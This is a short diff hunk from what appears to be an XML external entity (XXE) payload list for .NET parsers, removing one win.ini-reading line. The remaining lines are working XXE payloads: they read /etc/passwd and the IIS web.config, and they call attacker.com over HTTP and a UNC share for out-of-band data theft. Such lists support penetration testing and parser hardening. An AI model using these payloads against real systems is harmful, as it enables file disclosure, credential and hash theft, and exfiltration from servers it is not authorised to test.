@@ -129,7 +129,6 @@
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 
 # ── .NET XXE (XmlReader / XmlDocument / XPathDocument) ──
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE configuration [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><configuration>&xxe;</configuration>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/netdata">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "\\\\attacker.com\\xxe">]><foo>&xxe;</foo>
